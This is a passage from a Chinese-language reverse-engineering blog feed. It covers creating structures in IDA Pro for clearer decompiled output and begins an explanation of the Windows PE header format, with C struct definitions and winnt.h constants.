__<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n"</span>,</span><br><span class="line">    &amp;book,</span><br><span class="line">    (<span class="keyword">char</span> *)&amp;book + <span class="number">10</span>,</span><br><span class="line">    (<span class="keyword">char</span> *)&amp;book + <span class="number">20</span>,</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_100001040);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 IDA 并不能解析出我们构造的结构体。IDA 之所以在分析阶段无法识别结构体，可能源于两个原因。</p><ol><li>首先，虽然 IDA 了解某个结构体的布局，但它并没有足够的信息，能够判断程序确实使用了结构体。</li><li>其次，程序中的结构体可能是一种 IDA 对其一无所知的非标准结构体。</li></ol><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>关于结构体我们所会使用的主要操作包括添加、删除和编辑结构体。首先打开 Structures（结构体）窗口，使用热键 INSERT 打开 Creat Structure/Union（创建结构体/联合）对话框。</p><p><img src="/pics/如何使用IDA创建结构体/1.png" alt="Creat Structure/Union（创建结构体/联合）对话框"></p><p>为了创建一个新的结构体，必须首先在 Structure name（结构体名称）输入框中指定结构体的名称。前两个复选框用于决定新结构体在结构体窗口中的显示位置，或者是否在窗口中显示新结构体。第三个复选框 Creat union（创建联合），指定你定义的是否为 C 风格联合结构体。结构体的大小是它所包含的字段大小的总和，而联合的大小则等于其中最大字段的大小。Add standard structure（添加标准结构体）按钮用于访问 IDA 当前能够识别的全部结构体数据类型。指定结构体的名称并单击 OK 后，IDA 将在结构体窗口中创建一个空结构体定义。</p><p><img src="/pics/如何使用IDA创建结构体/2.png" alt="空结构体"></p><p>为了给新结构体添加字段，必须利用字段创建命令 D、A 和数字键盘上的星号键(*)。D 命令的行为非常依赖于光标的位置，建议采用下面的步骤给结构体添加字段。</p><ol><li>首先将光标放在结构体定义的最后一行（包含 ends 的那一行）并按下 D 键。这时，IDA 就会在结构体的末尾添加一个新字段。新字段的大小取决于你在数据转盘上选择的第一个大小。最初，字段的名称为 field_N，这里的 N 为结构体开头到新字段(如 field_0)开头的数字偏移量。</li><li>如果需要修改字段的大小，首先将光标放在新字段的名称上，然后重复按下 D 键，使数据转盘上的数据类型开始循环，从而为新字段选择正确的数据大小。另外，你还可以使用 Options ► Setup Data Types 来指定一个在数据转盘上不存在的大小。如果新字段是一个数组，右击其名称并在上下文菜单中选择 Array，将打开“数组规范”对话框。</li><li>要更改一个结构体字段的名称，单击字段名称并按下 N 键，或者右击该名称并在上下文菜单中选择 Name，然后在输入框中输入一个名称即可。</li></ol><p>根据以上步骤，可以构造如下结构体。</p><p><img src="/pics/如何使用IDA创建结构体/3.png" alt="含有四个变量的结构体"></p><p>在定义自己的结构体时，下面的提示可能会有所帮助。</p><ol><li>一个字段的字节偏移量以一个 8 位十六进制值在结构体窗口的左侧显示。</li><li>每次你添加或删除一个结构体字段，或更改一个现有字段的大小，结构体的新 sizeof 大小都会在结构体定义的第一行反映出来。</li><li>可以给一个结构体字段添加注释，就像给任何反汇编行添加注释一样。右击（或使用热键）希望为其添加注释的字段，在上下文菜单中选择一个注释选项即可。</li><li>与结构体窗口顶部的说明不同的是，只有当一个字段是结构体中的最后一个字段时，使用 U 键才能删除该字段。对于所有其他字段，按下 U 键将取消该字段的定义，这样做仅仅删除了该字段的名称，并没有删除分配给该字段的字节。</li><li>必须对一个结构体定义中的所有字段进行适当的对齐。IDA 并不区分已压缩和未压缩的结构体。为将字段适当对齐，如需要填补字节，那么必须负责添加这些字节。填补字节最好作为适当大小的哑字段添加。在添加额外的字段后，可以选择取消或保留这些字段的定义。</li><li>分配到结构体中间的字节只有在取消关联字段的定义后才能删除，使用 Edit ► Shrink Struct Type（缩小结构体类型）即可删除被取消定义的字节。</li><li>可以在结构体的中间添加新的字节：选择新字节后面的一个字段，然后使用 Edit ► Expand Struct Type（扩大结构体类型）在选中的字段前插入一定数量的字节。</li><li>如果知道结构体的大小，而不了解它的布局，就需要创建两个字段。第一个字段为一个数组，它的大小为结构体的大小减去 1 个字节(size-1)；第二个字段应为 1 个字节。创建第二个字段后，取消第一个（数组）字段的定义。这样，结构体的大小被保留下来，随后，当进一步了解该结构体的布局后，可以回过头来定义它的字段及其大小。</li></ol><p>通过重复应用这些步骤（添加字段、设置字段大小、添加填补字节等），就可以在 IDA 中创建一个 Books 结构体。</p><p><img src="/pics/如何使用IDA创建结构体/4.png" alt="最终的结构体信息"></p><p>重新给变量设置数据类型为 Book，得到如下结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n"</span>, &amp;book, &amp;book.gap1[<span class="number">9</span>], &amp;book.gapC[<span class="number">8</span>], unk_100001040);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种方法是直接导入新的结构体。IDA 能够解析 C（而非 C++）数据声明，以及整个 C 头文件，并自动为在这些声明或头文件中定义的结构体创建对应的 IDA 结构体。如果碰巧有正在进行逆向的二进制文件的源代码，或者头文件，那么就可以让 IDA 直接从源代码中提取出相关结构体，从而节省大量时间。</p><p>IDA 5.2 版引入了 “本地类型” 子窗口，使用 View ► OpenSubviews ► Local Types（查看 ► 打开子窗口 ► 本地类型）打开该窗口，其中列出了所有解析到当前数据库中的类型。新数据库的“本地类型”窗口最初是空的，但是，该窗口能够通过 INSERT 键或上下文菜单中的 Insert 选项解析新的类型。</p><p><img src="/pics/如何使用IDA创建结构体/5.png" alt="直接导入结构体"></p><p>解析新类型时发生的错误将在 IDA 的消息窗口中显示。如果类型声明被成功解析，“本地类型” 窗口将列出该类型及其相关声明。可以看到先前在 Structures 窗口添加的结构体和刚才直接导入的结构体信息。</p><p><img src="/pics/如何使用IDA创建结构体/6.png" alt="结构体信息"></p><p>重新设置变量的数据类型为 Book2，可以得到一个完美的结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n"</span>,</span><br><span class="line">    &amp;book,</span><br><span class="line">    book.author,</span><br><span class="line">    book.subject,</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">int</span>)book.book_id);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://www.idabook.com/" target="_blank" rel="noopener">The IDA Pro Book</a><br><a href="https://www.runoob.com/cprogramming/c-structures.html" target="_blank" rel="noopener">https://www.runoob.com/cprogramming/c-structures.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IDA 无法直接反编译出程序所构造的结构体，但我们可以通过观察伪代码来判断并在 IDA 中创建结构体&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>RE入门（三）</title>
    <link href="https://qianfei11.github.io/2019/08/28/RE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://qianfei11.github.io/2019/08/28/RE入门（三）/</id>
    <published>2019-08-28T05:03:31.000Z</published>
    <updated>2019-08-30T03:31:54.812Z</updated>
    
    <content type="html"><![CDATA[<p>摘自<a href="https://reversecore.com/" target="_blank" rel="noopener">《逆向工程核心原理》</a>中关于 Windows 操作系统的 PE（Portable Executable）文件格式的部分，其中也有关于进程、内存、DLL 等的内容，它们是 Windows 操作系统中最核心的部分。</p><a id="more"></a><h1 id="PE-文件格式"><a href="#PE-文件格式" class="headerlink" title="PE 文件格式"></a>PE 文件格式</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>PE 文件是 Windows 操作系统下使用的可执行文件格式。它是微软在 UNIX 平台的 COFF（Common Object File Format，通用对象文件格式）基础上制作而成的。最初（正如 Portable 这个单词所代表的那样）设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列的操作系统下。</p><p>PE 文件是指 32 位的可执行文件，也称为 PE32。64 位的可执行文件成为 PE+ 或 PE32+，是 PE（PE32）文件的一种扩展形式（请注意不是 PE64）。</p><h2 id="PE-文件格式-1"><a href="#PE-文件格式-1" class="headerlink" title="PE 文件格式"></a>PE 文件格式</h2><p>PE 文件种类如表所示。</p><table><thead><tr><th style="text-align:center">种类</th><th style="text-align:center">主扩展名</th></tr></thead><tbody><tr><td style="text-align:center">可执行系列</td><td style="text-align:center">EXE、SCR</td></tr><tr><td style="text-align:center">库系列</td><td style="text-align:center">DLL、OCX、CPL、DRV</td></tr><tr><td style="text-align:center">驱动程序系列</td><td style="text-align:center">SYS、VXD</td></tr><tr><td style="text-align:center">对象文件系列</td><td style="text-align:center">OBJ</td></tr></tbody></table><p>严格地说，OBJ（对象）文件之外的所有文件都是可执行的。DLL、SYS 文件等虽然不能直接在 Shell（<code>Explorer.exe</code>）中运行，但可以使用其他方式（调试器、服务等）执行。</p><blockquote><p>根据 PE 正式规范，编译结果 OBJ 文件也视为 PE 文件。但是 OBJ 文件本身不能以任何形式执行，在代码逆向分析中几乎不需要关注它。</p></blockquote><p>接下来以记事本（Windows XP SP3 的 <code>notepad.exe</code>，与其他版本 Windows 下的 <code>notepad.exe</code> 文件结构类似，但是地址不同）程序进行简单说明。</p><p>下面是 <code>notepad.exe</code> 文件的起始部分，也是 PE 文件的头部分（PE header）。<code>notepad.exe</code> 文件运行需要的所有信息就存储在这个 PE 头中。如果加载到内存、从何处开始运行、运行中需要的 DLL 有哪些、需要多大的栈/堆内存等，大量信息以结构体形式存储在 PE 头中。换言之，学习 PE 文件格式就是学习 PE 头中的结构体。</p><p><img src="/pics/BIN集训/RE/三/1.png" alt="notepad.exe 文件"></p><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p><code>notepad.exe</code> 具有普通 PE 文件的基本结构。从 DOS 头（DOS header）到节区头（Section header）是 PE 头部分，其下的节区合称 PE 体。文件中使用偏移（offset），内存中使用 VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区的大小、位置等）。文件的内容一般可分为代码（<code>.text</code>）、数据（<code>.data</code>）、资源（<code>.rsrc</code>）节，分别保存。</p><blockquote><p>根据所用的不同开发工具（VB/VC++/Delphi/etc）与编译选项，节区的名称、大小、个数、存储的内容等都是不同的。最重要的是它们按照不同的用途分类保存到不同的节中。</p></blockquote><p>各节区头定义了各节区在文件或内存中的大小、位置、属性等。</p><p>PE 头与各节区的尾部存在一个区域，称为 NULL 填充（Null padding）。计算机中，为了提高处理文件、内存、网络包的效率，使用“最小基本单位”这一概念，PE 文件中也类似。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数位置上，空白区域将用 NULL 填充（可以看到各节区起始地址的截断都遵循一定的规则）。</p><p><img src="/pics/BIN集训/RE/三/2.png" alt="PE文件（notepad.exe）加载到内存中的情形"></p><h3 id="VA-amp-RVA"><a href="#VA-amp-RVA" class="headerlink" title="VA&amp;RVA"></a>VA&amp;RVA</h3><p>VA 指的是进程虚拟内存的绝对地址，RVA（Relative Virtual Address，相对虚拟地址）指从某个基准位置（ImageBase）开始的相对地址。VA 和 RVA 满足下面的换算关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RVA+ImageBase=RA</span><br></pre></td></tr></table></figure><p>PE 头内部信息大多以 RVA 形式存在。原因在于，PE 文件（主要是 DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他 PE 文件（DLL）。此时必须通过重定位（Relocation）将其加载到其他空白的位置，若 PE 头信息使用的是 VA，则无法正常访问。因此使用 RVA 来定位信息，即使发生了重定位，只要相对于基准位置的相对地址没有变化，就能正常访问到指定信息，不会出现任何问题。</p><blockquote><p>32 位 Windows OS 中，各进程分配有 4GB 的虚拟内存，因此进程中 VA 值的范围是 00000000~FFFFFFFF。</p></blockquote><h2 id="PE-头"><a href="#PE-头" class="headerlink" title="PE 头"></a>PE 头</h2><p>PE 头由许多结构体组成。</p><h3 id="DOS-头"><a href="#DOS-头" class="headerlink" title="DOS 头"></a>DOS 头</h3><p>微软创建 PE 文件格式时，人们正广泛使用 DOS 文件，所以微软充分考虑了 PE 文件对 DOS 文件的兼容性。其结果是在 PE 头的最前面添加了一个 <code>IMAGE_DOS_HEADER</code> 结构体，用来扩展已有的 DOS EXE 头。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span></span><br><span class="line">    WORD    e_magic;         <span class="comment">// DOS signature : 4D5A ("MZ")</span></span><br><span class="line">    WORD    e_cblp;</span><br><span class="line">    WORD    e_cp;</span><br><span class="line">    WORD    e_crlc;</span><br><span class="line">    WORD    e_cparhdr;</span><br><span class="line">    WORD    e_minalloc;</span><br><span class="line">    WORD    e_maxalloc;</span><br><span class="line">    WORD    e_ss;</span><br><span class="line">    WORD    e_sp;</span><br><span class="line">    WORD    e_csum;</span><br><span class="line">    WORD    e_ip;</span><br><span class="line">    WORD    e_cs;</span><br><span class="line">    WORD    e_lfarlc;</span><br><span class="line">    WORD    e_ovno;</span><br><span class="line">    WORD    e_res[<span class="number">4</span>];</span><br><span class="line">    WORD    e_oemid;</span><br><span class="line">    WORD    e_oeminfo;</span><br><span class="line">    WORD    e_res2[<span class="number">10</span>];</span><br><span class="line">    LONG    e_lfanew;        <span class="comment">// offset to NT header</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p><code>IMAGE_DOS_HEADER</code> 结构体的大小为 40 个字节。在该结构中必须知道 2 个重要成员：<code>e_magic</code> 与 <code>e_lfanew</code>。</p><ul><li><code>e_magic</code>：DOS 签名（signature，4D5A=&gt;ASCII 值“MZ”）</li><li><code>e_lfanew</code>：指示 NT 头的偏移（根据不同文件拥有可变值）</li></ul><p>所有 PE 文件在你开始部分（<code>e_magic</code>）都有 DOS 签名（“MZ”）。<code>e_lfanew</code> 值指向 NT 头所在位置（NT 头的名称为 <code>IMAGE_NT_HEADERS</code>，后面将会介绍）。</p><blockquote><p>一个名叫 Mark Zbikowski 的开发人员在微软设计了 DOS 可执行文件，MZ 即取自其名字的首字母。</p></blockquote><p><img src="/pics/BIN集训/RE/三/3.png" alt="IMAGE_DOS_HEADERS"></p><p>根据 PE 规范，文件开始的 2 个字节为 4D5A，<code>e_lfanew</code> 的值为 000000E0（不是 E0000000）</p><blockquote><p>Intel 系列的 CPU 以逆序存储数据，称为小端序标识法。</p></blockquote><p>如果尝试修改这些值，会发现程序无法正常运行（因为根据 PE 规范，它已不再是 PE 文件了）。</p><h3 id="DOS-存根"><a href="#DOS-存根" class="headerlink" title="DOS 存根"></a>DOS 存根</h3><p>DOS 存根（stub）在 DOS 头下方，是个可选项，且大小不固定（即使没有 DOS 存根，文件也能正常运行）。DOS 存根由代码与数据混合而成。</p><p><img src="/pics/BIN集训/RE/三/4.png" alt="DOS 存根"></p><p>图中，文件偏移 40~4D 区域为 16 位的汇编指令。32 位的 Windos OS 中不会运行该命令（由于被识别为 PE 文件，所以完全忽视该代码）。在 DOS 环境中运行 <code>Notepad.exe</code> 文件，或者使用 DOS 调试器（<code>debug.exe</code>）运行它，可使其执行该代码（不认识 PE 文件格式，所以被识别为 DOS EXE 文件）。</p><p>在 Windows XP 下打开命令行窗口（<code>cmd.exe</code>），输入<code>debug C:\Windows\notepad.exe</code>。输入 “u” 指令（Unassemble），将会出现 16 位的汇编指令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-u</span><br><span class="line">0B39:0000 0E            PUSH    CS</span><br><span class="line">0B39:0001 1F            POP     DS</span><br><span class="line">0B39:0002 BA0E00        MOV     DX,000E         ; DX = 0E : &quot;This program cannot be run in DOS mode&quot;</span><br><span class="line">0B39:0005 B409          MOV     AH,09</span><br><span class="line">0B39:0007 CD21          INT     21              ; AH = 09 : WriteString()</span><br><span class="line">0B39:0009 B8014C        MOV     AX,4C01</span><br><span class="line">0B39:000C CD21          INT     21              ; AX = 4C01 : Exit()</span><br><span class="line">0B39:000E 54            PUSH    SP</span><br><span class="line">0B39:000F 68            DB      68</span><br><span class="line">0B39:0010 69            DB      69</span><br><span class="line">0B39:0011 7320          JNB     0033</span><br><span class="line">0B39:0013 7072          JO      0087</span><br><span class="line">0B39:0015 6F            DB      6F</span><br><span class="line">0B39:0016 67            DB      67</span><br><span class="line">0B39:0017 7261          JB      007A</span><br><span class="line">0B39:0019 6D            DB      6D</span><br><span class="line">0B39:001A 206361        AND     [BP+DI+61],AH</span><br><span class="line">0B39:001D 6E            DB      6E</span><br><span class="line">0B39:001E 6E            DB      6E</span><br><span class="line">0B39:001F 6F            DB      6F</span><br></pre></td></tr></table></figure><p>代码非常简单，在画面中输出字符串 <code>&quot;This program cannot be run in DOS mode&quot;</code> 后就退出。换言之，<code>notepad.exe</code>文件虽然是 32 位的 PE 文件，但是带有 MS-DOS 兼容模式，可以在 DOS 环境中运行，执行 DOS EXE 代码，输出 <code>&quot;This program cannot be run in DOS mode&quot;</code> 后终止。灵活使用该特性可以在一个可执行文件（EXE）中创建出另一个文件，它在 DOS 与 Windows 中都能运行（在 DOS 环境中运行 16 位 DOS 代码，在 Windows 环境中运行 32 位 Windows 代码）。</p><p>如前所述，DOS 存根是可选项，开发工具应该支它（VB、VC++、Delphi 等默认支持 DOS 存根）。</p><h3 id="NT-头"><a href="#NT-头" class="headerlink" title="NT 头"></a>NT 头</h3><p>下面介绍 NT 头 <code>IMAGE_NT_HEADERS</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;                   <span class="comment">// PE Signature : 50450000 ("PE"00)</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p><code>IMAGE_NT_HEADERS</code> 结构体由 3 个成员组成，第一个成员为签名（Signature）结构体，其值为 50450000h（”PE”00）。另外沥青个成员分别为文件头（File Header）与可选头（Optional Header）结构体。</p><p><img src="/pics/BIN集训/RE/三/5.png" alt="IMAGE_NT_HEADERS"></p><p><code>IMAGE_NT_HEADERS</code> 结构体的大小为 F8，相当大。</p><h3 id="NT-头：文件头"><a href="#NT-头：文件头" class="headerlink" title="NT 头：文件头"></a>NT 头：文件头</h3><p>文件头是表现文件大致属性的 <code>IMAGE_FILE_HEADER</code> 结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machinie;               <span class="comment">// 运行平台</span></span><br><span class="line">    WORD    NumberOfSections;       <span class="comment">// 区块表的个数</span></span><br><span class="line">    DWORD   TimeDateStamp;          <span class="comment">// 文件创建时间，是从 1970 年至今的秒数</span></span><br><span class="line">    DWORD   PointerToSymbolTable;   <span class="comment">// 指向符号表的指针</span></span><br><span class="line">    DWORD   NumberOfSymbols;        <span class="comment">// 符号表的数目</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;   <span class="comment">// IMAGE_NT_HEADERS 结构中 OptionHeader 成员的大小，对于 Win32 平台这个值通常是 0x00E0</span></span><br><span class="line">    WORD    Characteriistics;       <span class="comment">// 文件的属性值</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p><code>IMAGE_FILE_HEADERS</code> 结构体中有如下 4 中重要成员（若它们设置不正确，将导致文件无法正常运行）。</p><h4 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a>Machine</h4><p>每个 CPU 都拥有唯一的 Machine 码，兼容 32 位 Intel x86 芯片的 Machine 码为 14C。以下是定义在 <code>winnt.h</code> 文件中的 Machine 码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_UNKNOWN      0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_I386         0x014c  <span class="comment">// Intel 386.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_R3000        0x0162  <span class="comment">// MIPS little-endian, 0x160 big-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_R4000        0x0166  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_R10000       0x0168  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_WCEMIPSV2    0x0169  <span class="comment">// MIPS little-endian WCE v2</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA        0x0184  <span class="comment">// Alpha_AXP</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_POWERPC      0x01F0  <span class="comment">// IBM PowerPC Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH3          0x01a2  <span class="comment">// SH3 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH3E         0x01a4  <span class="comment">// SH3E little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH4          0x01a6  <span class="comment">// SH4 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ARM          0x01c0  <span class="comment">// ARM Little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_THUMB        0x01c2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_IA64         0x0200  <span class="comment">// Intel 64</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_MIPS16       0x0266  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU      0x0366  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU16    0x0466  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA64      0x0284  <span class="comment">// ALPHA64</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AXP64        IMAGE_FILE_MACHINE_ALPHA64</span></span><br></pre></td></tr></table></figure><h4 id="NumberOfSections"><a href="#NumberOfSections" class="headerlink" title="NumberOfSections"></a>NumberOfSections</h4><p>前面提到过，PE 文件把代码、数据、资源等依据属性分类到各节区中存储。</p><p><code>NumberOfSections</code> 用来指出文件中存在的节区数量。该值一定要大于 0，且当定义的节区数量与实际节区不同时，将发生运行错误。</p><h4 id="SizeOfOptionalHeader"><a href="#SizeOfOptionalHeader" class="headerlink" title="SizeOfOptionalHeader"></a>SizeOfOptionalHeader</h4><p><code>IMAGE_NT_HEADER</code> 结构体的最后一个成员为 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体。<code>SizeOfOptionalHeader</code> 成员用来指出 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体的长度。<code>IMAGE_OPTIONAL_HEADER32</code> 结构体由 C 语言编写而成，故其大小已经确定。但是 Windows 的 PE 装载器需要查看 <code>IMAGE_FILE_HEADER</code> 的 <code>SizeOfOptionalHeader</code> 值，从而识别出 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体的大小。</p><p>PE32+ 格式的文件中使用的是 <code>IMAGE_OPTIONAL_HEADER64</code> 结构体，而不是 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体。2 个结构体的尺寸是不同的，所以需要在 <code>SizeOfOptionalHeader</code> 成员中明确指出结构体的大小。</p><blockquote><p>借助 <code>IMAGE_DOS_HEADER</code> 的 <code>e_lfanew</code> 成员与 <code>IMAGE_FILE_HEADER</code> 的 <code>SizeOfOptionalHeader</code> 成员，可以创建出一种脱离常规的 PE 文件（PE Patch）（也有人称之为 “麻花” PE 文件）</p></blockquote><h4 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h4><p>该字段用于标识文件的属性，文件是否可运行的形态、是否为 DLL 文件等信息，以 bit OR 形式组合起来。</p><p>以下是定义在 <code>winnt.h</code> 文件中的 <code>Characteristics</code> 值（请记住 0002h 与 2000h 这两个值）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_RELOCS_STRIPPED          0x0001  <span class="comment">// Relocation info stripped from file.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_EXECUTABLE_IMAGE         0x0002  <span class="comment">// File is executable</span></span></span><br><span class="line">                                                    <span class="comment">// (i.e. no unresolved externel references).</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_LINE_NUMS_STRIPPED       0x0004  <span class="comment">// Line numbers stripped from file.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_LOCAL_SYMS_STRIPPED      0x0008  